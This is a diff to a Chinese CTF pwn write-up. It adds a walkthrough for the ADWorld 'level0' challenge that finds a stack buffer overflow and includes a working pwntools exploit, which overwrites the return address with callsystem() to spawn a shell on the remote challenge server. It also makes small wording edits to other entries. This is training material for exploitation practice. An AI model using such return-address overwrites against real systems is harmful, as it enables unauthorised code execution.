@@ -263,6 +263,51 @@ io.interactive()
 
 ------
 
+#### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)
+
+先`file ./hello_pwn`查看文件类型和`checksec --file=hello_pwn`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/1.png)
+
+用`IDA Pro 64bit`打开附件`level0`，按`F5`反汇编源码并查看主函数，发现`vulnerable()`函数很可疑。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/2.png)
+
+双击`vulnerable()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x200`个字节，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/3.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x80`个字节占满`buf`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/4.png)
+
+在`Function Window`中注意到有一个名为`callsystem()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`callsystem()`函数的起始地址`0x400596`即可。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/5.png)
+
+编写`Python`代码即可得到`cyberpeace{abcdc2f34ed094260c9ef32f07e7465b}`。
+
+```python
+from pwn import *
+
+io = remote('111.200.241.244', 53710)
+e = ELF('level0')
+address = e.symbols['callsystem']
+log.success('callsystem_address => %s' % hex(address).upper())
+payload = b'a'*(0x80) + b'fuckpwn!' + p64(address)
+# payload = b'a'*(0x80) + b'fuckpwn!' + p64(0x400596)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5053/6.png)
+
+------
+
+
+
+------
+
 ## CTFShow
 
 #### pwn02
@@ -279,7 +324,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn02/3.png)
 
-双击`s`变量查看其在内存中的地址信息，构造`payload`时可以先用`9`个字节占满`s`变量，然后再加上`r`的`4`个字节。
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`9`个字节占满`s`变量，然后再加上`r`的`4`个字节。
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn02/4.png)
 
@@ -307,7 +352,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn05/3.png)
 
-双击`s`变量查看其在内存中的地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`4`个字节。
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`4`个字节。
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn05/4.png)
 
